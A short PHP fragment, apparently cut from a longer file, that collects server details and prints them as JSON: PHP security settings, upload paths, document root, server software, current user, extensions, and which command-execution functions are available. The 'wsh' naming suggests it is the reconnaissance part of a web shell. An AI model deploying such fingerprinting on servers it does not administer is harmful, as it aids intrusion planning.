  'safeMode' => trim(ini_get('safe_mode')),
  'allowUrlFopen' => trim(ini_get('allow_url_fopen')),
  'allowUrlInclude' => trim(ini_get('allow_url_include')),
  'displayErrors' => trim(ini_get('display_errors')),
  'fileUploads' => trim(ini_get('file_uploads')),
  'uploadTmpDir' => trim(ini_get('upload_tmp_dir')),
  'docRoot' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
  'serverSoftware' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
  'user' => function_exists('get_current_user') ? get_current_user() : '',
  'extensions' => get_loaded_extensions(),
  'execFunctions' => $execAvailable,
  'anyExec' => $anyExec,
);
echo wsh_json($out);`
